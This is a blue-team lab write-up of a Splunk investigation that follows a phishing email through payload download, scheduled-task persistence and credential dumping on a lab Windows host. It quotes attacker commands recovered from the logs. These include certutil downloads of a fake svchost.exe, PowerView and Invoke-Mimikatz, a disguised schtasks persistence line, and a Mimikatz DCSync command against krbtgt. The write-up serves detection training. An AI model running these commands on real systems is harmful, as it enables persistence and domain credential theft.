---
layout: writeup
title: "Splunk IT"
date: 2026-06-17
platform: Blue Teams Labs
difficulty: Easy
SIEM: Splunk
image: /assets/splunk-it.png
---

## Overview

This lab simulates a full SOC-style incident investigation involving a phishing email, malicious file execution, network connections, persistence, and post-exploitation activity on a Windows domain host. The investigation begins with a user-reported phishing message named **"Invoice"** and follows the attack chain from the initial download of the malicious document to the execution of additional payloads and credential-dumping activity.

Throughout the timeline, multiple Windows and Sysmon artifacts are correlated to reconstruct the attacker's behavior on `DESKTOP1.CYBERRANGE.local`. The analysis covers network indicators, process execution, file creation, scheduled task persistence, internal reconnaissance tooling, and credential access techniques. By reviewing these events in sequence, it becomes possible to identify the compromised user, the malicious infrastructure involved, and the attacker's persistence and lateral movement mechanisms.

---

## Q1 — Malicious Download Source IP

**Question:** An employee reported receiving a phishing email named "Invoice." What is the IP address and port from which the malicious file was downloaded? *(Format: X.X.X.X:Port)*

### Investigation

The investigation started by searching for the filename mentioned in the report — **"Invoice"** — to identify the affected user and host.

```splunk
ComputerName="DESKTOP1.CYBERRANGE.local" "Invoice*" | table User ComputerName
```

![Invoice search — identifying the affected host]({{ '/assets/writeups/splunk-it/image-1.png' | relative_url }})

*Search for "Invoice" events confirms the affected host as `DESKTOP1.CYBERRANGE.local` and identifies the user `CYBERRANGE\ricksanchez`.*

With the host confirmed, the next step was to examine **EventCode=3** (Sysmon network connection events) to identify remote destinations the host communicated with during the suspicious activity window.

```splunk
ComputerName="DESKTOP1.CYBERRANGE.local" EventCode=3
```

![EventCode=3 — Network connections overview]({{ '/assets/writeups/splunk-it/image-2.png' | relative_url }})

*Network connection events on the host, showing outbound `DestinationIp` values for correlation with the download timeline.*

After correlating event timestamps, the IP address **`139.59.21.147`** was identified as matching the download window.

![Timeline correlation — 139.59.21.147 identified]({{ '/assets/writeups/splunk-it/image-3.png' | relative_url }})

*Timestamp correlation confirms `139.59.21.147` as the server contacted during the malicious file download.*

A refined query was then used to confirm the destination port:

```splunk
ComputerName="DESKTOP1.CYBERRANGE.local" EventCode=3 DestinationIp="139.59.21.147"
| table _time ComputerName DestinationIp DestinationPort
```

![Destination port confirmed as 8080]({{ '/assets/writeups/splunk-it/image-4.png' | relative_url }})

*The filtered query confirms the connection was made to `139.59.21.147` on port `8080`.*

**Answer:** `139.59.21.147:8080`

---

## Q2 — Downloaded Payload Path

**Question:** What file was downloaded after the malicious document was opened? Provide the full path. *(Format: C:\path\to\file.ext)*

### Investigation

To identify the downloaded payload, process creation (**EventCode=1**) and file creation (**EventCode=11**) events were correlated. Splunk Universal Forwarder binaries were excluded to reduce noise and focus on attacker activity:

```splunk
ComputerName="DESKTOP1.CYBERRANGE.local" (EventCode=1 OR EventCode=11)
  Image!="C:\Program Files\SplunkUniversalForwarder\bin\splunk-admon.exe"
  Image!="C:\Program Files\SplunkUniversalForwarder\bin\splunk-MonitorNoHandle.exe"
  Image!="C:\Program Files\SplunkUniversalForwarder\bin\splunk-netmon.exe"
  Image!="C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe"
  Image!="C:\Program Files\SplunkUniversalForwarder\bin\splunk-regmon.exe"
| sort 0 _time
```

A `certutil` command was identified in the `CommandLine` field, revealing both the remote source and the local destination of the download:

```cmd
certutil -urlcache -split -f "http://24.199.117.142:1337/svchost.exe" "C:\Windows\Temp\svchost.exe"
```

![certutil command — svchost.exe download path]({{ '/assets/writeups/splunk-it/image-5.png' | relative_url }})

*The `CommandLine` field reveals the full download command: `certutil` was used to fetch and save `svchost.exe` to `C:\Windows\Temp\`.*

**Answer:** `C:\Windows\Temp\svchost.exe`

---

## Q3 — Attacker's Download URL

**Question:** What is the URL from which additional files were being downloaded? *(Format: http://something:port/file.ext)*

### Investigation

The download URL was already exposed in the `certutil` command identified in the previous question. The full URL used by the attacker to deliver the payload was:

```
http://24.199.117.142:1337/svchost.exe
```

![Full download URL in the certutil command]({{ '/assets/writeups/splunk-it/image-6.png' | relative_url }})

*The attacker's C2 server at `24.199.117.142:1337` was used as the staging server to deliver the malicious `svchost.exe` binary.*

**Answer:** `http://24.199.117.142:1337/svchost.exe`

---

## Q4 — Compromised Domain User

**Question:** Which domain user was compromised? *(Format: Username)*

### Investigation

The compromised account was identified by inspecting the `User` field associated with the malicious process execution events. The `certutil` download and subsequent payload execution were consistently tied to the same domain account.

![User field — CYBERRANGE\ricksanchez]({{ '/assets/writeups/splunk-it/image-7.png' | relative_url }})

*The `User` field in the Sysmon event confirms the account `CYBERRANGE\ricksanchez` as the user context under which the malicious commands ran.*

![Event detail — ricksanchez confirmed]({{ '/assets/writeups/splunk-it/image-8.png' | relative_url }})

*Additional event detail corroborating `ricksanchez` as the compromised account.*

**Answer:** `ricksanchez`

---

## Q5 — Persistence Mechanism Program

**Question:** Was any persistence action detected? If so, name the program used. *(Format: filename.ext)*

### Investigation

After the payload was dropped, the attacker established persistence using a Windows scheduled task. The event timeline showed `schtasks.exe` being invoked with parameters that pointed to the malicious binary:

```cmd
schtasks.exe /create /tn "Microsoft Teams Updater" /sc onlogon /tr C:\Windows\Temp\svchost.exe
```

![schtasks.exe persistence command]({{ '/assets/writeups/splunk-it/image-9.png' | relative_url }})

*`schtasks.exe` was used to create a scheduled task that runs the malicious `svchost.exe` at every user logon, establishing persistent execution.*

**Answer:** `schtasks.exe`

---

## Q6 — Scheduled Task Name

**Question:** What is the name of the scheduled task used for persistence? *(Format: Task Name)*

The task was deliberately named to appear legitimate and blend in with genuine Windows system tasks, reducing the likelihood of detection during a casual review.

**Answer:** `Microsoft Teams Updater`

---

## Q7 — Reconnaissance Script

**Question:** What well-known attacker script was dropped for internal reconnaissance and enumeration? *(Format: filename.ext)*

### Investigation

During the timeline review, an additional script download was identified. The `certutil` binary was used again to retrieve a PowerShell script from a public GitHub repository:

```cmd
certutil.exe -urlcache -f https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 PowerView.ps1
```

![PowerView.ps1 download via certutil]({{ '/assets/writeups/splunk-it/image-10.png' | relative_url }})

*`certutil` was used to download `PowerView.ps1` from the PowerSploit GitHub repository directly to the compromised host.*

**PowerView** is part of the PowerSploit offensive framework and is widely used by attackers and red teamers for Active Directory enumeration, domain trust mapping, and user/group discovery.

**Answer:** `PowerView.ps1`

---

## Q8 — Credential Dumping Tool

**Question:** What additional file was deployed by the attacker to extract credentials? *(Format: filename.ext)*

### Investigation

Later in the attack timeline, another malicious script was observed. The same delivery method — `certutil` downloading from `raw.githubusercontent.com` — was used to retrieve the credential dumping tool:

```cmd
certutil.exe -urlcache -f https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1 Invoke-Mimikatz.ps1
```

![Invoke-Mimikatz.ps1 download]({{ '/assets/writeups/splunk-it/image-11.png' | relative_url }})

*`Invoke-Mimikatz.ps1` was downloaded to the host and subsequently executed for credential access operations.*

**Answer:** `Invoke-Mimikatz.ps1`

---

## Q9 — Credential Dumping Technique

**Question:** What credential dumping technique, similar to a method commonly used in domain controller environments, was employed? *(Format: TechniqueName)*

### Investigation

After `Invoke-Mimikatz.ps1` was executed, the attacker invoked the **DCSync** technique. DCSync abuses Active Directory replication privileges to request credential material — including NTLM hashes and Kerberos keys — directly from a domain controller, without requiring local access to the DC's LSASS process.

The Splunk event showed the following command executed under the `CYBERRANGE\ricksanchez` user context:

```powershell
powershell.exe . .\Invoke-Mimikatz.ps1 ; Invoke-Mimikatz -Command '"lsadump::dcsync /domain:CYBERRANGE.local /user:krbtgt"'
```

![DCSync command via Invoke-Mimikatz]({{ '/assets/writeups/splunk-it/image-12.png' | relative_url }})

*The attacker used `Invoke-Mimikatz` with the `lsadump::dcsync` command to extract the `krbtgt` account hash from Active Directory, which enables Golden Ticket attacks.*

**Answer:** `DCSync`

---

## Attack Timeline Summary

| Time (UTC-5) | Event | MITRE ATT&CK |
|---|---|---|
| 11:33:51 | Host connects to `139.59.21.147:8080` — malicious document delivered | T1566.001 — Phishing: Spearphishing Attachment |
| 11:37:36 | `certutil` downloads `svchost.exe` from `24.199.117.142:1337` to `C:\Windows\Temp\` | T1105 — Ingress Tool Transfer |
| 11:53:28 | `schtasks.exe` creates "Microsoft Teams Updater" task pointing to `svchost.exe` | T1053.005 — Scheduled Task |
| ~11:54 | `certutil` downloads `PowerView.ps1` from GitHub | T1059.001 — PowerShell |
| ~11:54 | `certutil` downloads `Invoke-Mimikatz.ps1` from GitHub | T1003 — OS Credential Dumping |
| ~11:54 | `Invoke-Mimikatz` executes DCSync against `CYBERRANGE.local` for `krbtgt` | T1003.006 — DCSync |

---

## Tools & Artifacts

| Artifact | Type | Purpose |
|---|---|---|
| `certutil.exe` | Living-off-the-Land Binary (LOLBin) | File download / payload delivery |
| `svchost.exe` (malicious) | Dropped binary | C2 beacon / implant |
| `schtasks.exe` | Windows built-in | Persistence via scheduled task |
| `PowerView.ps1` | PowerSploit module | AD enumeration and reconnaissance |
| `Invoke-Mimikatz.ps1` | Credential dumping tool | DCSync / credential extraction |
| Splunk + Sysmon | SIEM / EDR telemetry | Detection and investigation platform |
